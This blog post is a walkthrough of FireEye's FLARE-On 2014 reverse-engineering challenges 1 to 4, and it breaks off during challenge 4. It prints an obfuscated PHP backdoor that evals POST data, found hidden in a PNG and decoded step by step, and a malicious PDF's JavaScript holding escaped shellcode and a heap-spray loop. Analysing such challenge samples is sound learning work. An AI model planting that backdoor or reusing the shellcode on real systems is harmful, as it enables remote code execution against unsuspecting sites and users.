---
categories:
- Reverse Engineering
- Writeup
tags:
- FlareOn
- FireEye
- Python
comments: true
date: 2014-09-23T02:31:44Z
title: My Adventure with Fireeye FLARE Challenge
aliases:
- "/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/"
---

These are my (rather long) solutions to Fireeye's FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.

If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.

I am a bit late to the party. There <del>were two</del> are now other three solutions posted (that I know of). Check them out.

* [Detailed Solutions to FireEye FLARE Challenge](https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge)
* [A Walk through for FLARE RE Challenges](http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html)
* The FLARE On Challenge Solutions by Fireye
  - [Part 1 - solutions for challenges 1 to 5](http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html)
  - [Part 2 - solutions for challenges 6 and 7](https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html)

<!--more-->

### Links to Individual Challenges
This post is quite long (I didn't want to strip them into different posts), use the following links to jump to any specific challenge:

* [Challenge 1](#ch1)
* [Challenge 2](#ch2)
* [Challenge 3](#ch3)
* [Challenge 4](#ch4)
* [Challenge 5](#ch5)
* [Challenge 6](#ch6)
* [Challenge 7](#ch7)

### My Setup
I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.

### Helpful Tools
* [7-zip](http://www.7-zip.org/download.html)
* [PE-Studio](http://www.winitor.com/): Gain information about the binary **without running it.** It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don't give it internet access
* [dotPeek](http://www.jetbrains.com/decompiler/): Free .NET decompiler by JetBrains
* [.NET Reflector](http://www.red-gate.com/products/dotnet-development/reflector/): .NET decompiler. Not free but comes with a 2-week trial period
* [HxD](http://mh-nexus.de/en/downloads.php?product=HxD): Free Windows hex editor
* [Notepad++](http://notepad-plus-plus.org/): Slick FOSS text-editor
* [Immunity Debugger](http://debugger.immunityinc.com/ID_register.py): Windows debugger. Very similar to [OllyDbg](http://www.ollydbg.de/)
* [pyew](https://code.google.com/p/pyew/): A Python tool for static malware analysis. I used it for PDF analysis
* [IDA](https://www.hex-rays.com/products/ida/): What can I say? It's great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us
* [Bless](http://home.gna.org/bless/): Linux Hex editor
* [API Monitor](http://www.rohitab.com/apimonitor): Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them
* [Wireshark](https://www.wireshark.org/download.html): FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap
* [Microsoft Network Monitor](http://www.microsoft.com/en-us/download/details.aspx?id=4865): Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by [Microsoft Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=40308)

---

## <a name="ch1"></a> Challenge 1 - Bob Roge
The challenge starts with going to their website at [http://flare-on.com](http://flare-on.com) and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn't work on my VM.

![Self-Extracting zip failed :(](/images/2014/flare/1-1.jpg "Self-Extracting zip failed :(")

I opened it with ``7-zip`` to get ``Challenge1.exe``. By dropping it into ``PE-Studio`` I gained more information:

```
The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
The Manifest Identity name (MyApplication.app) is different than the Image name
The Version Information 'OriginalFilename' (rev_challenge_1.exe) is different than the Image name
The Debug Symbol File Name () is different than the Image name (challenge1)
The image is Managed (.NET)
```

So it appears to be a .Net binary. Let's run it.

![Challenge 1 executed](/images/2014/flare/1-2.jpg "Challenge 1 executed")

Hey I love this guy. Let's press ``DECODE.``

![Much decode](/images/2014/flare/1-3.jpg "Much decode")

Look at that garbled data. We can decompile it (remember it's a .Net binary). Using ``dotPeek`` we can see the code for ``Decode`` button:

{{< codecaption lang="c#" title="btnDecode_click" >}}
private void btnDecode_Click(object sender, EventArgs e)
{
  this.pbRoge.Image = (Image) Resources.bob_roge; // change the image
  byte[] datSecret = Resources.dat_secret;        // interesting
  string str1 = "";
  for (int index = 0; index < datSecret.Length; ++index)
  {
	byte num = datSecret[index];
	str1 = str1 + (object) (char) (((int) num >> 4 | (int) num << 4 & 240) ^ 41);
  }
  string str2 = str1 + "\0";
  string str3 = "";
  int index1 = 0;
  while (index1 < str2.Length)
  {
	str3 = str3 + (object) str2[index1 + 1] + (object) str2[index1];
	index1 += 2;
  }
  string str4 = "";
  for (int index2 = 0; index2 < str3.Length; ++index2)
  {
	int num = (int) str3[index2];
	str4 = str4 + (object) (char) ((uint) (byte) str3[index2] ^ 102U);
  }
  this.lbl_title.Text = str4;
}
{{< /codecaption >}}

Line 4 reads ``dat_secret`` and the rest of the function manipulates it before displaying it on the form. To save this file expand ``resources`` and select ``rev_challenge_1.dat_secret.encode``. Right click and select ``Save Resource to File.``

![Saving private secret](/images/2014/flare/1-4.jpg "Saving private secret")

I used ``HxD`` to look at the contents.

{{< codecaption title="Contents of dat_secret" lang="bash" >}}
A1 B5 44 84 14 E4 A1 B5 D4 70 B4 91 B4 70 D4 91 E4 C4 96 F4 54 84 B5 C4 40 64 74 70 A4 64 44
¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD
{{< /codecaption >}}

Let's run the code with ``dat_secret`` and print the result after each level (i.e. ``str2, str3 and str4``). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using [repl.it](http://repl.it/languages). Str1 is the answer so we don't care about the rest:

{{< codecaption lang="python" title="Decoding dat_secret" >}}
from binascii import unhexlify

datsecret = unhexlify ("A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444")
str1=""

for item in datsecret:
    num = ord(item)
    str1 +=  chr( ( num >> 4 | num << 4 & 240) ^ 41 )

print str1
{{< /codecaption >}}

#### Level 1 flag: 3rmahg3rd.b0b.d0ge@flare-on.com

---

## <a name="ch2"></a> Challenge 2 - A Study in JavaScript
```
Well done! Looks like you kicked that one. I've attached the next challenge for your reversing pleasure. The password to this zip archive is "malware".
We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
Hopefully you'll knock this one out too, Good luck!

-FLARE
```
Inside the archive seems to be a copy of the original [http://flare-on.com](http://flare-on.com) with a launch date countdown timer. I will be calling the html page from the website ``original_html`` and the one in the zip file ``challenge_html``.

{{< codecaption lang="powershell" title="Contents of challenge zip file" >}}
-rwx------+ 1 TyRaX None 8378 home.html

directory called "img" with one single png
-rwx------+ 1 TyRaX None 9560 flare-on.png
{{< /codecaption >}}

![challenge_html](/images/2014/flare/2-1.jpg "challenge_html")

The original web page looks a bit different.
{{< codecaption lang="powershell" title="Original web page" >}}
-rwx------+ 1 TyRaX None 6254 The FLARE On Challenge.htm

and
-rwx------+ 1 TyRaX None 116290 bootstrap.css
-rwx------+ 1 TyRaX None   6596 flare-on-V2.png
{{< /codecaption >}}

![original_html](/images/2014/flare/2-2.jpg "original_html")

The timer threw me off track. Is it really a countdown timer? When does it reach zero?  
I changed the time in my VM to mess with it but it synced up with host.  

{{< codecaption lang="powershell" title="To de-sync guest and host time/date" >}}
# vboxmanage is in the VirtualBox installation directory
# So on Windows: C:\Program Files\Oracle\VirtualBox
vboxmanage setextradata [VMname] "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" "1"
{{< /codecaption >}}

Changing the time did not mess with anything.

We can diff the htmls or use Notepad++'s [compare](http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/) plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, ``original_html`` has ``<img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png">`` while ``challenge_html`` includes ``<img src="img/flare-on.png">``. So the file in the website is version 2 of the image. Later in the ``challenge_html`` we see more evidence of this image file ``<?php include "img/flare-on-V3.png" ?>``. But wait a minute, the filesize of these images were different:

{{< codecaption lang="powershell" title="Different sizes" >}}
-rwx------+ 1 TyRaX None 9560 Jul  7 21:30 flare-on.png
-rwx------+ 1 TyRaX None 6596 Dec 18  2013 flare-on-V2.png
{{< /codecaption >}}

The challenge png is bigger. I used ``HxD`` to compare these two files (as they are not text) and at the end of ``flare-on.png`` I saw some PHP code. To be honest I was thinking of steganography or some [Ange Albertini magic](https://twitter.com/angealbertini). But that would have been too hard for level 2. Here is the PHP code (beautified):

{{< codecaption lang="php" title="Code inside png" >}}
<?php
$terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");
$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);

$do_me="";

for ($i=0;$i<count($order);$i++)
{
	$do_me=$do_me.$terms[$order[$i]];
}

eval($do_me);
?>
{{< /codecaption >}}

Find an online tool to run this PHP code or re-write it in Python . My Python code:

{{< codecaption lang="python" title="Code re-written in Python" >}}
terms = ["M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|"]

order= [59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47]

do_me = ""
for i in range(0,len(order)):
    do_me += terms[order[i]]

print do_me
{{< /codecaption >}}

Produces the following PHP code:
{{< codecaption lang="php" title="PHP code" >}}
$_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65"; // base64_decode
eval($___($__));
{{< /codecaption >}}

Contents of ``$_`` and ``$__`` are clearly encoded in ``base64`` and  ``$___`` is ``base64_decode``. Base64 can be decoded in Python by calling ``base64.b64decode``.
Line #4 can be re-written as

{{< codecaption lang="php" title="Line 4" >}}

eval(base64_decode('JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'));

// result

$code=base64_decode($_);    eval($code);

{{< /codecaption >}}

So it must decode the first base64 blob and eval it. Let's decode it:

{{< codecaption lang="php" title="Decoded line 4" >}}

if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]))
{
eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}

{{< /codecaption >}}

This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let's print them using Python and hope this is the last encoding:

{{< codecaption lang="python" title="Decoder code in Python" >}}

mylist= [97,49,49,68,0x4F,84,116,0x68,97,0x74,0x44,0x4F,0x54,0x6A,97,0x76,0x61,0x35,0x63,0x72,97,0x70,0x41,84,0x66,0x6C,97,0x72,0x65,0x44,65,0x53,72,111,110,68,79,84,99,0x6F,0x6D]

print ''.join( chr(item) for item in mylist)

{{< /codecaption >}}

Fortunately, we are done.

#### Level 2 flag: a11DOTthatDOTjava5crapATflareDASHonDOTcom or a11.that.java5crap@flare-on.com

---

## <a name="ch3"></a> Challenge 3 - Cheating My Way to the Top

```
Nice job, you're really knocking these out! Here's the next binary. The password to the zip archive is "malware" again.
Keep up the good work, and good luck!
-FLARE
```

Challenge 3 is a Win32 binary called ``such_evil``. ``PE-Studio`` does not tell us much.

Running it will result in this message:

![BrokenByte](/images/2014/flare/3-1.jpg "BrokenByte")

I cheated in this challenge. I just dropped the executable in ``Immunity Debugger``, ran it and looked in memory when the message box popped up and the email was there:

![Flag in memory](/images/2014/flare/3-2.jpg "Flag in memory")

#### Level 3 flag: such.5h311010101@flare-on.com

---

## <a name="ch4"></a> Challenge 4 - Things are Getting Cereal

```
Well done! Such dedication, much work, wow.
Here's the next challenge, password is the same as last time. We'll talk more when you figure it out.
-FLARE
```

It's a two page PDF named ``APT9001.pdf``. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a ``HxD`` but it won't tell us much.
There are tools that will help us parse the PDF. I used ``pyew``. You can find a good tutorial for PDF analysis [here](https://code.google.com/p/pyew/wiki/PDFAnalysis).  
Let's follow the tutorial:

{{< codecaption lang="python" title="pyew output for the PDF" >}}

$ python pyew.py APT9001.pdf
PDF File

PDFiD 0.0.11 APT9001.pdf
 PDF Header: %PDF-1.5
 obj                   10
 endobj                 9
 stream                 3
 endstream              3
 xref                   2
 trailer                2
 startxref              2
 /Page                  3(2)
 /Encrypt               0
 /ObjStm                0
 /JS                    1(1)
 /JavaScript            1(1)
 /AA                    0
 /OpenAction            1(1)
 /AcroForm              0
 /JBIG2Decode           1(1)
 /RichMedia             0
 /Launch                0
 /Colors > 2^24         0
 %%EOF                  1
 After last %%EOF       0
 Total entropy:           7.862012 (     21284 bytes)
 Entropy inside streams:  7.890539 (     19723 bytes)
 Entropy outside streams: 4.745484 (      1561 bytes)

# first 512 bytes of the PDF removed

# To list the streams that are encoded and see what filters the stream is using type "pdfilter":
[0x00000000]> pdfilter
Stream 1 uses FlateDecode
Stream 1 uses ASCIIHexDecode
Stream 2 uses FlateDecode
Stream 2 uses ASCIIHexDecode
Stream 2 uses JBIG2Decode
Stream 3 uses FlateDecode

{{< /codecaption >}}

Seems like streams 1,2 and 3 are interesting. According to the tutorial ``pdfvi`` displays them.

* FlateDecode: Decompress. In Python do ``zlib.decompress``
* ASCIIHexDecode: Decode from ASCII Hex
* JBIG2Decode: Decode as a black and white image

What really threw me off was the ``JBIG2Decode`` decoder for stream 2. There was a [vulnerability](http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html) associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). ``Pyew`` also displays the disassembly but it is not shellcode either (if it is, then I didn't recognize it). It is also not an image (hence the ``JBIG2Decode`` filter).

{{< codecaption lang="nasm" title="Stream 2" >}}
Applying Filter FlateDecode ...
Applying Filter ASCIIHexDecode ...
Applying Filter JBIG2Decode ...
Encoded Stream 2
--------------------------------------------------------------------------------
0000   00 20 50 FF 40 00 00 69 00 00 05 69 50 50          . P.@..i...iPP
--------------------------------------------------------------------------------

Show disassembly (y/n)? [n]: y
0x00000000 (02) 0020                 ADD [EAX], AH
0x00000002 (01) 50                   PUSH EAX
0x00000003 (03) ff40 00              INC DWORD [EAX+0x0]
0x00000006 (03) 0069 00              ADD [ECX+0x0], CH
0x00000009 (01) 00                   DB 0x0
0x0000000a (01) 05                   DB 0x5
0x0000000b (01) 69                   DB 0x69
0x0000000c (01) 50                   PUSH EAX
0x0000000d (01) 50                   PUSH EAX

{{< /codecaption >}}

Let's take a look at stream 1 using ``pdfvi``.

{{< codecaption lang="js" title="Stream 1" >}}

[0x00000000]> pdfvi
Applying Filter FlateDecode ...
Applying Filter ASCIIHexDecode ...
Encoded Stream 1
--------------------------------------------------------------------------------
    var HdPN = "";
    var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";

    // important
    var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%
ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9
ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412
d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%
u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub
7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7
e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%
u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4
190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b
f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%
uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7
69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb
0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%
u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4
879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881
4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%
ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7
b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257
7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%
u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4
1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317
4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%
ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue
3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b
9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%
u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0
27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033
c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%
uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8
b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726
2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%
u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2
c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31
6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%
u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9
8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f
f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%
u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5
068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");

    // not important
    var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";
    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL+= unescape("%ub32f%u3791");
    ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
    OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
